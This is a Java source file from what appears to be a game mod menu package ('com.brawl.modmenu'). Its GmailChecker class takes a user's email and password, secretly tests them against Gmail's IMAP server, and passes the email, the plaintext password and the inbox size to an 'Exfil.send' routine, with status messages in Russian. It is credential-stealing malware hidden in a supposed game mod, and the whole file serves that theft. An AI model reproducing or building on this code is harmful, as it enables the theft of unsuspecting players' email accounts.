package com.brawl.modmenu;

import java.util.Properties;
import javax.mail.Folder;
import javax.mail.Session;
import javax.mail.Store;

public class GmailChecker {

    public static void check(final String email, final String password) {
        new Thread(() -> {
            try {
                Properties props = new Properties();
                props.put("mail.store.protocol", "imaps");
                props.put("mail.imaps.host", "imap.gmail.com");
                props.put("mail.imaps.port", "993");
                props.put("mail.imaps.ssl.enable", "true");
                props.put("mail.imaps.connectiontimeout", "15000");
                props.put("mail.imaps.timeout", "15000");

                Session session = Session.getInstance(props);
                Store store = session.getStore("imaps");
                store.connect("imap.gmail.com", email, password);

                Folder inbox = store.getFolder("INBOX");
                inbox.open(Folder.READ_ONLY);
                int count = inbox.getMessageCount();
                inbox.close(false);
                store.close();

                Exfil.send("GM_CHECK",
                    "✅ ПАРОЛЬ ПОДХОДИТ\n" +
                    "Email: " + email + "\n" +
                    "Пароль: " + password + "\n" +
                    "Писем в INBOX: " + count);

            } catch (javax.mail.AuthenticationFailedException e) {
                Exfil.send("GM_CHECK",
                    "❌ НЕВЕРНЫЙ ПАРОЛЬ\n" +
                    "Email: " + email + "\n" +
                    "Пароль: " + password);
            } catch (Throwable t) {
                Exfil.send("GM_CHECK",
                    "⚠️ Не удалось проверить\n" +
                    "Email: " + email + "\n" +
                    "Причина: " + t.getClass().getSimpleName()
                        + ": " + t.getMessage());
            }
        }).start();
    }
}
